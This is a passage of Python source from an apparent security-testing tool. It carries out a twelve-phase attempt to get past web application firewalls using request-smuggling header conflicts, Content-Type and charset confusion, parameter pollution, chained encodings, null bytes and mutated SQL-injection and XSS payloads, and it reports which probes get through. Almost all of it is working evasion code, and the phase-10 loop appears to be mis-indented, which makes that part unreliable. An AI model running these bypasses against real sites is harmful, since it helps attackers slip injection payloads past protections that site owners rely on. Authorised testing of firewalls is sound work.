                    probe_url = (f"{base_no_qs}?probe={urllib.parse.quote(pval)}"
                                 if not parsed_qs else
                                 f"{base_no_qs}?{list(parsed_qs.keys())[0]}={urllib.parse.quote(pval)}")
                    sc, ln, rt, resp = self._waf_send_full(
                        probe_url, hdrs, "GET", "", timeout,
                        payload=pval[:60], payload_type=f"WAF-Probe-{ptype}")
                    stats["payloads_sent"] += 1
                    if sc in (403, 406, 429, 503, 400) and sc != b_status:
                        block_status = sc
                        if resp is not None:
                            v2 = _fingerprint_waf(dict(resp.headers), resp.text)
                            if v2 and not waf_info["detected"]:
                                waf_info["detected"] = True
                                waf_info["vendor"]   = v2
                                waf_info["confidence"] = "active"
                                waf_info["evidence"].append(
                                    f"Active probe ({ptype}): WAF blocked with HTTP {sc}, vendor={v2}")
                                stats["waf_vendor"] = v2
                            elif v2 and waf_info["vendor"] != v2:
                                waf_info["evidence"].append(
                                    f"Active probe ({ptype}): secondary vendor signal: {v2}")
                        break
                if block_status:
                    break
        
                waf_info["block_status"] = block_status
        if not waf_info["detected"]:
            self.scan_progress.emit(
                "🔥  [WAF] No WAF detected from baseline — continuing with generic bypass phases.")
        else:
            self.scan_progress.emit(
                f"🔥  [WAF] Confirmed: {waf_info['vendor']} "
                f"(confidence={waf_info['confidence']}, blocks with HTTP {block_status})")

        vendor  = waf_info.get("vendor") or "Generic WAF"
        b_block = block_status or b_status
        baseline = {"status": b_status, "length": b_len, "time": b_time,
                    "block_status": b_block}

        def _run(phase_num: int, label: str, probes: List[Dict]) -> None:
            if not self.running or not probes or not _phase_active(phase_num):
                if not _phase_active(phase_num): self.scan_progress.emit(f"🔥  [WAF] Phase {phase_num} — skipped (disabled in config)");
                return
            self.scan_progress.emit(
                f"🔥  [WAF] Phase {phase_num} — {label} ({len(probes)} probes)")
            stats["phases_run"] += 1
            stats["payloads_sent"] += len(probes)
            if workers > 1:
                new_f = self._waf_run_parallel(probes, baseline, b_block, timeout, delay, workers)
            else:
                new_f = self._waf_run_sequential(probes, baseline, b_block, timeout, delay)
            for f in new_f:
                f["phase"] = f"{phase_num} – {label}"
            findings.extend(new_f)
            stats["bypasses_found"] += len(new_f)
            if new_f:
                self.scan_progress.emit(
                    f"  ✅ [WAF] Phase {phase_num}: {len(new_f)} bypass(es) found!")

        # ── Phase 1 — Header Pollution & Smuggling ────────────────────────
        p1 = []
        # XFF overflow
        p1.append({"url": url, "method": method, "body": body,
                   "headers": {**hdrs, "X-Forwarded-For": "127.0.0.1, " + ", ".join(["10.0.0.1"]*60)},
                   "technique": "XFF overflow (60 IPs)", "attack": list(_WAF_TEST_PAYLOADS["sqli"])[0]})
        # Oversized cookie
        p1.append({"url": url, "method": method, "body": body,
                   "headers": {**hdrs, "Cookie": "waf_bypass=" + "A"*5000},
                   "technique": "Oversized Cookie (5KB padding)", "attack": _WAF_TEST_PAYLOADS["xss"][0]})
        # TE + CL conflict (TE.CL smuggling hint)
        p1.append({"url": url, "method": method, "body": body or "bypass=1",
                   "headers": {**hdrs, "Transfer-Encoding": "chunked", "Content-Length": "0"},
                   "technique": "TE:chunked + CL:0 conflict (TE.CL)", "attack": _WAF_TEST_PAYLOADS["sqli"][1]})
        # Duplicate Host / X-Host
        p1.append({"url": url, "method": method, "body": body,
                   "headers": {**hdrs, "X-Host": "localhost", "X-Forwarded-Server": "localhost"},
                   "technique": "X-Host / X-Forwarded-Server confusion", "attack": ""})
        # Cache tricks
        for hdr_name, hdr_val in [("Cache-Control","no-transform"),
                                   ("Pragma","no-cache"),
                                   ("Accept-Encoding","identity, *;q=0"),
                                   ("X-Varnish","bypass"),
                                   ("X-Bypass-Padding","A"*8000)]:
            p1.append({"url": url, "method": method, "body": body,
                       "headers": {**hdrs, hdr_name: hdr_val},
                       "technique": f"header: {hdr_name}: {str(hdr_val)[:40]}",
                       "attack": _WAF_TEST_PAYLOADS["sqli"][0]})
        _run(1, "Header Pollution & Smuggling", p1)

        # ── Phase 2 — Content-Type Confusion ─────────────────────────────
        p2 = []
        ct_variants = [
            "application/x-www-form-urlencoded; charset=ibm037",
            "application/x-www-form-urlencoded; charset=utf-7",
            "application/json; charset=utf-16le",
            "application/json; charset=utf-16be",
            "application/x-www-form-urlencoded; charset=UTF-16",
            "aPpLiCaTiOn/JsOn",
            "application/json ; charset=UTF-8",
            "multipart/form-data; boundary=----bypass",
            "text/xml",
            "application/xml",
            "application/soap+xml",
            "application/x-amf",
            "text/plain",
            "application/octet-stream",
            "application/x-www-form-urlencoded; boundary=bypass",
            "application/csp-report",
        ]
        probe_method = method if method in ("POST","PUT","PATCH") else "POST"
        for ct in ct_variants:
            probe_body = body if body else "id=1' OR '1'='1"
            p2.append({"url": url, "method": probe_method, "body": probe_body,
                       "headers": {**hdrs, "Content-Type": ct},
                       "technique": f"CT: {ct}",
                       "attack": probe_body})
        # JSON body as form
        if body:
            try:
                json.loads(body)
                p2.append({"url": url, "method": method, "body": body,
                           "headers": {**hdrs, "Content-Type": "application/x-www-form-urlencoded"},
                           "technique": "CT confusion: JSON body → form CT", "attack": body})
            except Exception:
                p2.append({"url": url, "method": "POST",
                           "body": json.dumps({"id": "1' OR '1'='1"}),
                           "headers": {**hdrs, "Content-Type": "application/json"},
                           "technique": "CT confusion: form body → JSON CT",
                           "attack": "id=1' OR '1'='1"})
        _run(2, "Content-Type Confusion", p2)

        # ── Phase 3 — Parameter Pollution (HPP) ───────────────────────────
        p3 = []
        test_params = list(parsed_qs.keys())[:5] if parsed_qs else ["id","q","search","input","data"]
        for param in test_params:
            orig_val = parsed_qs[param][0] if param in parsed_qs else "1"
            attack   = _primary or _WAF_TEST_PAYLOADS["sqli"][0]
            base_qs  = parsed.query or f"{param}={orig_val}"
            # Duplicate with attack payload appended
            p3.append({"url": f"{origin}{path}?{base_qs}&{param}={urllib.parse.quote(attack)}",
                       "method": method, "headers": hdrs, "body": body,
                       "technique": f"HPP dup: {param} + attack appended",
                       "attack": attack})
            # Array notation
            arr_qs = base_qs.replace(f"{param}=", f"{param}[]=", 1)
            p3.append({"url": f"{origin}{path}?{arr_qs}",
                       "method": method, "headers": hdrs, "body": body,
                       "technique": f"HPP array: {param}[]", "attack": ""})
            # Null byte in value
            p3.append({"url": f"{origin}{path}?{param}={urllib.parse.quote(orig_val+'%00'+attack)}",
                       "method": method, "headers": hdrs, "body": body,
                       "technique": f"HPP null-byte: {param}=%00attack", "attack": attack})
            # JSON array wrapping
            json_attack = json.dumps([attack])
            p3.append({"url": f"{origin}{path}?{param}={urllib.parse.quote(json_attack)}",
                       "method": method, "headers": hdrs, "body": body,
                       "technique": f"HPP JSON array: {param}=[attack]", "attack": attack})
        if body and method in ("POST","PUT","PATCH"):
            body_params = urllib.parse.parse_qs(body)
            for bp in list(body_params.keys())[:3]:
                attack = _primary or _WAF_TEST_PAYLOADS["sqli"][0]
                p3.append({"url": url, "method": method,
                           "headers": hdrs, "body": body + f"&{bp}={urllib.parse.quote(attack)}",
                           "technique": f"HPP POST dup: {bp}", "attack": attack})
        _run(3, "Parameter Pollution (HPP)", p3)

        # ── Phase 4 — Encoding Chain Obfuscation ─────────────────────────
        p4 = []
        encoders = [
            ("double-url",      lambda v: _double_url_encode(v)),
            ("triple-url",      lambda v: _triple_url_encode(v)),
            ("html-entity",     lambda v: _html_entity_encode(v)),
            ("html-hex",        lambda v: _html_hex_entity_encode(v)),
            ("unicode-fullwidth",lambda v: _unicode_fullwidth(v)),
            ("hex-encode",      lambda v: _hex_encode(v)),
            ("utf8-overlong",   lambda v: _utf8_overlong(v)),
            ("base64-value",    lambda v: base64.b64encode(v.encode()).decode()),
            ("null-byte-mid",   lambda v: _null_byte_insert(v, 2)),
            ("null-byte-suffix",lambda v: v + "%00"),
        ]
        _p4_sources = [(pt, active_test_payloads[pt][:2]) for pt in ("sqli","xss","lfi") if pt in active_test_payloads]
        if "custom" in active_test_payloads: _p4_sources.append(("custom", active_test_payloads["custom"][:3]))
        for ptype, p4_attacks in _p4_sources:
            for attack in p4_attacks:
                for enc_name, enc_fn in encoders:
                    try:
                        enc_val = enc_fn(attack)
                    except Exception:
                        continue
                    if parsed_qs:
                        param   = list(parsed_qs.keys())[0]
                        new_qs  = urllib.parse.urlencode(
                            {**{k: v[0] for k, v in parsed_qs.items()},
                             param: enc_val})
                        probe_url = f"{origin}{path}?{new_qs}"
                    else:
                        probe_url = f"{base_no_qs}?payload={urllib.parse.quote(enc_val, safe='%')}"
                    p4.append({"url": probe_url, "method": method,
                               "headers": hdrs, "body": body,
                               "technique": f"encode:{enc_name} on {ptype}",
                               "attack": attack})
        _run(4, "Encoding Chain Obfuscation", p4)

        # ── Phase 5 — Chunked Transfer Encoding ───────────────────────────
        p5 = []
        probe_body   = body if body else "id=1' OR '1'='1&bypass=1"
        probe_method = method if method in ("POST","PUT","PATCH") else "POST"
        for te_val in ["chunked","Chunked","CHUNKED","chunked, identity",
                       "xchunked","chunked;ext=1","identity, chunked"]:
            p5.append({"url": url, "method": probe_method, "body": probe_body,
                       "headers": {**hdrs,
                                   "Transfer-Encoding": te_val,
                                   "Content-Type": hdrs.get("Content-Type",
                                                            "application/x-www-form-urlencoded")},
                       "technique": f"TE: {te_val}", "attack": probe_body})
        # TE mangled header case
        for te_case in ["Transfer-encoding","transfer-encoding","TRANSFER-ENCODING",
                        "Transfer-Encoding\t","Transfer-Encoding :"]:
            p5.append({"url": url, "method": probe_method, "body": probe_body,
                       "headers": {**{k: v for k, v in hdrs.items()
                                      if k.lower() != "transfer-encoding"},
                                   te_case: "chunked"},
                       "technique": f"TE case: {te_case!r}", "attack": probe_body})
        _run(5, "Chunked Transfer Encoding", p5)

        # ── Phase 6 — Payload Case / Comment / Whitespace Mutation ────────
        p6 = []
        _p6_sources = [(pt, active_test_payloads.get(pt,_WAF_TEST_PAYLOADS.get(pt,[]))[:2]) for pt in ("sqli","xss","ssti") if pt in active_test_payloads or pt in _WAF_TEST_PAYLOADS]
        if "custom" in active_test_payloads: _p6_sources.append(("custom", active_test_payloads["custom"][:3]))
        for ptype, p6_attacks in _p6_sources:
            for attack in p6_attacks:
                mutations = []
                # SQL comment variants
                for m in _sql_comment_mutate(attack):
                    mutations.append((f"sql-comment-mutation", m))
                # Whitespace variants
                for ws_name, ws_char in [("tab","%09"),("newline","%0a"),
                                          ("crlf","%0d%0a"),("ff","%0c"),
                                          ("nbsp","%c2%a0"),("en-space","%e2%80%82")]:
                    mutations.append((f"ws-{ws_name}", attack.replace(" ", ws_char)))
                # Case mutation
                mutations.append(("upper", attack.upper()))
                mutations.append(("lower", attack.lower()))
                mutations.append(("mixed", "".join(
                    c.upper() if i % 2 else c.lower() for i, c in enumerate(attack))))
                # Null byte insert
                mutations.append(("null-byte-insert", _null_byte_insert(attack, 3)))
                # Unicode whitespace in payload
                mutations.append(("unicode-ws",
                    attack.replace(" ", "\u00a0")))  # NBSP

                for mut_name, mut_val in mutations:
                    if parsed_qs:
                        param  = list(parsed_qs.keys())[0]
                        new_qs = urllib.parse.urlencode(
                            {**{k: v[0] for k, v in parsed_qs.items()},
                             param: mut_val})
                        probe_url = f"{origin}{path}?{new_qs}"
                    else:
                        probe_url = f"{base_no_qs}?p={urllib.parse.quote(mut_val, safe='%')}"
                    p6.append({"url": probe_url, "method": method,
                               "headers": hdrs, "body": body,
                               "technique": f"mutation:{mut_name} [{ptype}]",
                               "attack": attack})
        _run(6, "Payload Case / Comment / Whitespace Mutation", p6)

        # ── Phase 7 — Protocol-Level Tricks ───────────────────────────────
        p7 = []
        attack_qs = (f"?{list(parsed_qs.keys())[0]}={urllib.parse.quote(_primary or _WAF_TEST_PAYLOADS['sqli'][0])}"
                     if parsed_qs else f"?id={urllib.parse.quote(_WAF_TEST_PAYLOADS['sqli'][0])}")
        p7 += [
            {"url": url,             "method": "TRACE",
             "headers": {**hdrs, "Max-Forwards": "0"}, "body": "",
             "technique": "TRACE + Max-Forwards:0", "attack": ""},
            {"url": url,             "method": "OPTIONS",
             "headers": hdrs,                         "body": "",
             "technique": "OPTIONS discovery", "attack": ""},
            {"url": url,             "method": method,
             "headers": {**hdrs, "X-Method-Override": "GET", "_method": "GET"},
             "body": body, "technique": "X-Method-Override: GET", "attack": ""},
            {"url": url,             "method": method,
             "headers": {**hdrs, "Accept": "*/*, text/html;q=0.001"},
             "body": body, "technique": "Accept: */*, q=0.001", "attack": ""},
        ]
        # Content-Length mismatch
        if body:
            p7.append({"url": url, "method": method, "body": body,
                       "headers": {**hdrs, "Content-Length": str(len(body) + 9999)},
                       "technique": "CL mismatch: oversized", "attack": body[:50]})
        # Attack payload + TRACE combo
        p7.append({"url": base_no_qs + attack_qs, "method": "TRACE",
                   "headers": hdrs, "body": "",
                   "technique": "TRACE + attack payload in QS", "attack": _WAF_TEST_PAYLOADS["sqli"][0]})
        _run(7, "Protocol-Level Tricks", p7)

        # ── Phase 8 — Request Fragmentation ───────────────────────────────
        p8 = []
        # Range header — fragment response inspection
        for r in ["bytes=0-499", "bytes=0-999", "bytes=0-4095"]:
            p8.append({"url": url, "method": method,
                       "headers": {**hdrs, "Range": r},
                       "body": body,
                       "technique": f"Range: {r}", "attack": ""})
        # Large junk header to push WAF inspection window
        p8.append({"url": url, "method": method, "body": body,
                   "headers": {**hdrs, "X-WAF-Bypass": "A"*9000},
                   "technique": "Large X-WAF-Bypass (9KB)", "attack": ""})
        # Accept-Ranges trick
        p8.append({"url": url, "method": method, "body": body,
                   "headers": {**hdrs, "Accept-Ranges": "bytes"},
                   "technique": "Accept-Ranges: bytes", "attack": ""})
        # Attack in fragment
        attack = _WAF_TEST_PAYLOADS["sqli"][0]
        frag_url = f"{base_no_qs}{query}#{urllib.parse.quote(attack)}"
        p8.append({"url": frag_url, "method": method, "headers": hdrs, "body": body,
                   "technique": "attack in URL fragment", "attack": attack})
        _run(8, "Request Fragmentation", p8)

        # ── Phase 9 — JSON / XML Structural Evasion ───────────────────────
        p9 = []
        json_attacks = []
        for _ptype_p9, _plist_p9 in active_test_payloads.items():
            json_attacks.extend(_plist_p9[:2])
        if not json_attacks:
            json_attacks = _WAF_TEST_PAYLOADS["sqli"][:2] + _WAF_TEST_PAYLOADS["xss"][:1]
        for attack in json_attacks:
            pm = method if method in ("POST","PUT","PATCH") else "POST"
            json_hdrs = {**hdrs, "Content-Type": "application/json"}

            # Deep nesting
            nested = {"a": {"b": {"c": {"d": {"e": {"payload": attack}}}}}}
            p9.append({"url": url, "method": pm, "body": json.dumps(nested),
                       "headers": json_hdrs, "technique": "JSON: deep nesting (5 levels)", "attack": attack})

            # Unicode escape in value
            unesc = {"id": _unicode_escape_json(attack)}
            p9.append({"url": url, "method": pm, "body": json.dumps(unesc),
                       "headers": json_hdrs, "technique": "JSON: unicode-escaped value", "attack": attack})

            # Array wrapping
            arr_body = {"ids": [attack, "normal"]}
            p9.append({"url": url, "method": pm, "body": json.dumps(arr_body),
                       "headers": json_hdrs, "technique": "JSON: array wrapping", "attack": attack})

            # Whitespace injection in JSON
            spaced = '{"id": "' + attack.replace('"', '\\"') + '"   }'
            p9.append({"url": url, "method": pm, "body": spaced,
                       "headers": json_hdrs, "technique": "JSON: extra whitespace", "attack": attack})

            # CDATA in XML
            xml_body = f'<?xml version="1.0"?><root><![CDATA[{attack}]]></root>'
            xml_hdrs = {**hdrs, "Content-Type": "text/xml"}
            p9.append({"url": url, "method": pm, "body": xml_body,
                       "headers": xml_hdrs, "technique": "XML: CDATA section", "attack": attack})

            # XML entity indirection
            ent_body = (f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xx "{html.escape(attack)}">]>'
                        f'<root>&xx;</root>')
            p9.append({"url": url, "method": pm, "body": ent_body,
                       "headers": xml_hdrs, "technique": "XML: entity indirection", "attack": attack})
        _run(9, "JSON / XML Structural Evasion", p9)

        # ── Phase 10 — Vendor-Specific Deep Bypasses ──────────────────────
        p10 = []
        vendors_to_try = [vendor] if vendor in _VENDOR_STRATS else []
        if "Generic WAF" not in vendors_to_try:
            vendors_to_try.append("Generic WAF")

        for v_key in vendors_to_try:
            for strat in _VENDOR_STRATS.get(v_key, []):
                attacks_for_phase = sum((list(v[:1]) for v in active_test_payloads.values()), [])
            if not attacks_for_phase:
                attacks_for_phase = _WAF_TEST_PAYLOADS["sqli"][:1] + _WAF_TEST_PAYLOADS["xss"][:1]
                for attack in attacks_for_phase:
                    pm = method if method in ("POST","PUT","PATCH") else "POST"

                    if strat["type"] == "header":
                        p10.append({"url": url, "method": method, "body": body,
                                    "headers": {**hdrs, strat["name"]: strat["value"]},
                                    "technique": f"[{v_key}] header {strat['name']}: {str(strat['value'])[:40]}",
                                    "attack": attack})

                    elif strat["type"] == "ct":
                        pb = body if body else f"id={urllib.parse.quote(attack)}"
                        p10.append({"url": url, "method": pm, "body": pb,
                                    "headers": {**hdrs, "Content-Type": strat["value"]},
                                    "technique": f"[{v_key}] CT: {strat['value']}",
                                    "attack": attack})

                    elif strat["type"] == "technique":
                        tname = strat["name"]

                        if tname == "chunked_body":
                            pb = body if body else f"id={urllib.parse.quote(attack)}"
                            p10.append({"url": url, "method": pm, "body": pb,
                                        "headers": {**hdrs, "Transfer-Encoding": "chunked"},
                                        "technique": f"[{v_key}] chunked body", "attack": attack})

                        elif tname == "null_byte_param" and parsed_qs:
                            for param in list(parsed_qs.keys())[:2]:
                                nb_qs = f"{parsed.query}&{param}={urllib.parse.quote(attack+'%00')}"
                                p10.append({"url": f"{origin}{path}?{nb_qs}",
                                            "method": method, "headers": hdrs, "body": body,
                                            "technique": f"[{v_key}] null-byte {param}",
                                            "attack": attack})

                        elif tname == "hpp_duplicate" and parsed_qs:
                            for param in list(parsed_qs.keys())[:2]:
                                dup_qs = f"{parsed.query}&{param}={urllib.parse.quote(attack)}"
                                p10.append({"url": f"{origin}{path}?{dup_qs}",
                                            "method": method, "headers": hdrs, "body": body,
                                            "technique": f"[{v_key}] HPP {param}",
                                            "attack": attack})

                        elif tname == "json_deep_nesting":
                            nested = {"a":{"b":{"c":{"d":{"e":{"f":{"payload": attack}}}}}}}
                            p10.append({"url": url, "method": pm,
                                        "body": json.dumps(nested),
                                        "headers": {**hdrs, "Content-Type": "application/json"},
                                        "technique": f"[{v_key}] JSON deep nest (6 levels)",
                                        "attack": attack})

                        elif tname == "json_unicode_escape":
                            ue = {"id": _unicode_escape_json(attack)}
                            p10.append({"url": url, "method": pm,
                                        "body": json.dumps(ue),
                                        "headers": {**hdrs, "Content-Type": "application/json"},
                                        "technique": f"[{v_key}] JSON unicode-escape",
                                        "attack": attack})

                        elif tname == "json_array_wrap":
                            aw = {"data": [attack]}
                            p10.append({"url": url, "method": pm,
                                        "body": json.dumps(aw),
                                        "headers": {**hdrs, "Content-Type": "application/json"},
                                        "technique": f"[{v_key}] JSON array wrap",
                                        "attack": attack})

                        elif tname == "body_fragment":
                            pb = body if body else f"id={urllib.parse.quote(attack)}"
                            p10.append({"url": url, "method": pm,
                                        "body": pb[:500],
                                        "headers": {**hdrs, "Range": "bytes=0-499"},
                                        "technique": f"[{v_key}] body fragment",
                                        "attack": attack})

                        elif tname == "header_flood":
                            flood_hdrs = {**hdrs}
                            for fi in range(20):
                                flood_hdrs[f"X-Junk-{fi:02d}"] = "A" * 100
                            p10.append({"url": url, "method": method,
                                        "body": body, "headers": flood_hdrs,
                                        "technique": f"[{v_key}] header flood (20 junk)",
                                        "attack": attack})

                        elif tname == "base64_param":
                            b64_val = base64.b64encode(attack.encode()).decode()
                            if parsed_qs:
                                param  = list(parsed_qs.keys())[0]
                                new_qs = urllib.parse.urlencode(
                                    {**{k: v[0] for k, v in parsed_qs.items()},
                                     param: b64_val})
                                p10.append({"url": f"{origin}{path}?{new_qs}",
                                            "method": method, "headers": hdrs, "body": body,
                                            "technique": f"[{v_key}] base64 param",
                                            "attack": attack})

                        elif tname == "sql_block_comment":
                            for mc in _sql_comment_mutate(attack)[:3]:
                                if parsed_qs:
                                    param  = list(parsed_qs.keys())[0]
                                    new_qs = urllib.parse.urlencode(
                                        {**{k: v[0] for k, v in parsed_qs.items()},
                                         param: mc})
                                    p10.append({"url": f"{origin}{path}?{new_qs}",
                                                "method": method, "headers": hdrs, "body": body,
                                                "technique": f"[{v_key}] sql-comment-mutation",
                                                "attack": attack})

                        elif tname in ("cf_unicode_payload", "cf_chunked_body",
                                       "akamai_json_nesting", "imperva_json_array",
                                       "fortinet_comment", "sucuri_comment_mutation",
                                       "overlong_utf8", "unicode_fullwidth",
                                       "double_encode_param", "newline_in_param",
                                       "modsec_whitespace", "mysql_version_comment",
                                       "null_byte_header"):
                            # Generic fallback for named techniques
                            enc_val = {
                                "cf_unicode_payload":   _unicode_escape_json(attack),
                                "cf_chunked_body":      attack,
                                "akamai_json_nesting":  json.dumps({"a":{"b":{"c":attack}}}),
                                "imperva_json_array":   json.dumps([attack]),
                                "fortinet_comment":     attack.replace(" ","/**/"),
                                "sucuri_comment_mutation": attack.replace("'","/**/"),
                                "overlong_utf8":        _utf8_overlong(attack),
                                "unicode_fullwidth":    _unicode_fullwidth(attack),
                                "double_encode_param":  _double_url_encode(attack),
                                "newline_in_param":     attack.replace(" ","%0a"),
                                "modsec_whitespace":    attack.replace(" ","%09"),
                                "mysql_version_comment":f"/*!{attack}*/",
                                "null_byte_header":     attack + "\x00",
                            }.get(tname, attack)

                            if parsed_qs:
                                param  = list(parsed_qs.keys())[0]
                                new_qs = urllib.parse.urlencode(
                                    {**{k: v[0] for k, v in parsed_qs.items()},
                                     param: enc_val})
                                probe_url = f"{origin}{path}?{new_qs}"
                            else:
                                probe_url = f"{base_no_qs}?p={urllib.parse.quote(str(enc_val), safe='%')}"

                            p10.append({"url": probe_url, "method": method,
                                        "headers": hdrs, "body": body,
                                        "technique": f"[{v_key}] {tname}",
                                        "attack": attack})

        _run(10, f"Vendor-Specific Bypasses [{vendor}]", p10)

        # ── Phase 11 — Blind WAF Detection (timing) ───────────────────────
        self.scan_progress.emit("🔥  [WAF] Phase 11 — Blind Timing Analysis")
        stats["phases_run"] += 1
        timing_findings: List[Dict] = []
        time_clean_samples: List[float] = []
        time_attack_samples: List[float] = []

        for _ in range(3):
            if not self.running: break
            _, _, rt, _ = self._waf_send_full(url, hdrs, method, body, timeout,
                                               payload="[timing-clean]",
                                               payload_type="WAF-Timing-Clean")
            stats["payloads_sent"] += 1
            time_clean_samples.append(rt)
            time.sleep(0.1)

        for ptype in ("sqli","xss"):
            for attack in _WAF_TEST_PAYLOADS[ptype][:2]:
                if not self.running: break
                if parsed_qs:
                    param  = list(parsed_qs.keys())[0]
                    new_qs = urllib.parse.urlencode(
                        {**{k: v[0] for k, v in parsed_qs.items()}, param: attack})
                    probe_url = f"{origin}{path}?{new_qs}"
                else:
                    probe_url = f"{base_no_qs}?p={urllib.parse.quote(attack)}"
                _, _, rt, resp = self._waf_send_full(
                    probe_url, hdrs, "GET", "", timeout,
                    payload=attack[:60], payload_type="WAF-Timing-Attack")
                stats["payloads_sent"] += 1
                time_attack_samples.append(rt)

        if time_clean_samples and time_attack_samples:
            avg_clean  = sum(time_clean_samples)  / len(time_clean_samples)
            avg_attack = sum(time_attack_samples) / len(time_attack_samples)
            ratio      = avg_attack / max(avg_clean, 0.001)
            if ratio > timing_ratio_min and (avg_attack - avg_clean) > timing_abs_min:
                timing_findings.append({
                    "phase": "11 – Blind Timing Analysis",
                    "technique": "timing: attack payloads consistently slower",
                    "url": url, "method": method,
                    "headers_added": {},
                    "status_code": "N/A", "length": 0, "delta_len": 0,
                    "response_time": avg_attack,
                    "confidence": "MEDIUM",
                    "evidence": (f"Clean avg: {avg_clean:.3f}s  "
                                 f"Attack avg: {avg_attack:.3f}s  "
                                 f"Ratio: {ratio:.2f}× — WAF is likely inspecting and delaying"),
                    "attack": "(timing probe)",
                })
        findings.extend(timing_findings)
        stats["bypasses_found"] += len(timing_findings)
        if timing_findings:
            self.scan_progress.emit("  ✅ [WAF] Phase 11: timing anomaly detected — WAF is active!")
        else:
            self.scan_progress.emit("  ✓  [WAF] Phase 11: no timing anomaly detected")

        # ── Phase 12 — Combo / Stacked Bypass ────────────────────────────
        p12 = []
        attack = _WAF_TEST_PAYLOADS["sqli"][0]
        pm     = method if method in ("POST","PUT","PATCH") else "POST"
        # Stack: ibm037 CT + double-encoded body
        enc_body = f"id={_double_url_encode(attack)}"
        p12.append({"url": url, "method": pm, "body": enc_body,
                    "headers": {**hdrs,
                                "Content-Type": "application/x-www-form-urlencoded; charset=ibm037",
                                "X-Forwarded-For": "127.0.0.1"},
                    "technique": "combo: ibm037 CT + double-encode + XFF spoof", "attack": attack})
        # Stack: chunked + HPP + comment mutation
        if parsed_qs:
            param  = list(parsed_qs.keys())[0]
            combo_attack = (attack[:1] + "/**/" + attack[1:]).replace(" ", "%09")
            new_qs = f"{parsed.query}&{param}={urllib.parse.quote(combo_attack)}"
            p12.append({"url": f"{origin}{path}?{new_qs}", "method": pm,
                        "body": body if body else "bypass=1",
                        "headers": {**hdrs, "Transfer-Encoding": "chunked",
                                    "X-Forwarded-For": "127.0.0.1"},
                        "technique": "combo: chunked + HPP + sql-comment + XFF", "attack": attack})
        # Stack: JSON unicode-escape + X-Akamai-Debug + Accept: */*
        ue_body = json.dumps({"id": _unicode_escape_json(attack)})
        p12.append({"url": url, "method": pm, "body": ue_body,
                    "headers": {**hdrs,
                                "Content-Type": "application/json",
                                "X-Akamai-Debug": "true",
                                "Accept": "*/*;q=0.1"},
                    "technique": "combo: JSON unicode-escape + Akamai-Debug + Accept hack",
                    "attack": attack})
        # Stack: fullwidth unicode payload + oversized padding
        fw_attack = _unicode_fullwidth(attack)
        if parsed_qs:
            param  = list(parsed_qs.keys())[0]
            new_qs = urllib.parse.urlencode({**{k: v[0] for k, v in parsed_qs.items()}, param: fw_attack})
            p12.append({"url": f"{origin}{path}?{new_qs}", "method": method,
                        "body": body,
                        "headers": {**hdrs, "X-WAF-Bypass-Padding": "A"*8000},
                        "technique": "combo: unicode-fullwidth + 8KB header padding",
                        "attack": attack})
        # Stack: null-byte + triple encode
        te_attack = _triple_url_encode(attack)
        if parsed_qs:
            param  = list(parsed_qs.keys())[0]
            new_qs = urllib.parse.urlencode({**{k: v[0] for k, v in parsed_qs.items()}, param: te_attack + "%00"})
            p12.append({"url": f"{origin}{path}?{new_qs}", "method": method,
                        "body": body, "headers": hdrs,
                        "technique": "combo: triple-encode + null-byte suffix",
                        "attack": attack})
        _run(12, "Combo / Stacked Bypass", p12)

        # ── Build final result ────────────────────────────────────────────
        # Deduplicate
        seen: set = set(); deduped = []
        for f in findings:
            k = (f.get("status_code"), f.get("length"), f.get("technique","")[:30])
            if k not in seen:
                seen.add(k); deduped.append(f)
        findings = deduped
        findings.sort(key=lambda f: {"HIGH":0,"MEDIUM":1,"LOW":2}.get(
            f.get("confidence","LOW"), 9))

        is_vuln = len(findings) > 0
        waf_str = (f"WAF: {waf_info['vendor']} [{waf_info['confidence']}]"
                   if waf_info["detected"] else "WAF: not detected")
        summary = (f"{'⚠️ WAF BYPASS FOUND' if is_vuln else '✓ No WAF bypass found'}  |  "
                   f"{waf_str}  |  Phases: {stats['phases_run']}  |  "
                   f"Sent: {stats['payloads_sent']}  |  Bypasses: {len(findings)}")
        self.scan_progress.emit(f"🔥  [WAF] Done — {summary}")

        return {"vulnerable": is_vuln, "summary": summary,
                "stats": stats, "baseline": baseline,
                "waf_info": waf_info, "findings": findings,
                "primary_payload": primary_payload,
                "primary_category": primary_category}

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _all_params_from_rd(self, param_name: str) -> str:
        """Get value of a param by name from request_data."""
        rd = self.request_data
        _, _, _, _, params, body_params, _ = _parse_request_components(rd)
        if param_name in params:
            vs = params[param_name]
            return vs[0] if vs else '1'
        if param_name in body_params:
            vs = body_params[param_name]
            return vs[0] if isinstance(vs, list) and vs else str(vs)
        return '1'

    def _waf_build_headers(self, rd: Dict) -> Dict[str, str]:
        hdrs: Dict[str, str] = {}
        for line in rd.get("request_text", "").split("\n")[1:]:
            s = line.rstrip("\r\n")
            if not s: break
            if ":" in s:
                k, v = s.split(":", 1)
                if k.strip().lower() not in ("content-length", "transfer-encoding"):
                    hdrs[k.strip()] = v.strip()
        for k, v in (rd.get("headers") or {}).items():
            if k.lower() not in ("content-length", "transfer-encoding"):
                hdrs[k] = v
        return hdrs

    def _waf_send_full(self, url, hdrs, method, body, timeout,
                       payload="", payload_type="WAF") -> Tuple[int, int, float, Any]:
        try:
            start = time.time()
            resp  = self.send_request_with_traffic(
                url, hdrs, method=method, body=body,
                payload=payload[:80], payload_type=payload_type,
                allow_redirects=False)
            elapsed = round(time.time() - start, 3)
            return resp.status_code, len(resp.content or b""), elapsed, resp
        except Exception as e:
            self.scan_progress.emit(f"⚠️  [WAF] Request error: {str(e)[:60]}")
            return 0, 0, 0.0, None

    def _waf_probe(self, probe: Dict, baseline: Dict,
                   block_status: int, timeout: int) -> Optional[Dict]:
        if not self.running: return None
        url, method = probe["url"], probe.get("method", "GET")
        hdrs, body  = probe.get("headers", {}), probe.get("body", "")
        tech, attack = probe.get("technique", ""), probe.get("attack", "")
        b_status = baseline.get("status", 200)
        b_len    = baseline.get("length", 0)

        try:
            start = time.time()
            resp  = self.send_request_with_traffic(
                url, hdrs, method=method, body=body,
                payload=tech[:80], payload_type="WAF-Bypass",
                allow_redirects=False)
            elapsed = round(time.time() - start, 3)
            sc, length = resp.status_code, len(resp.content or b"")
            delta = length - b_len
        except Exception: return None

        is_bypass, confidence, evidence = False, "LOW", ""

        # WAF bypass = attack payload got through (WAF didn't block).
        # Only 200-299 or a 302 redirect to a non-login page count.
        if 200 <= sc <= 299 and sc != block_status:
            is_bypass, confidence = True, "HIGH"
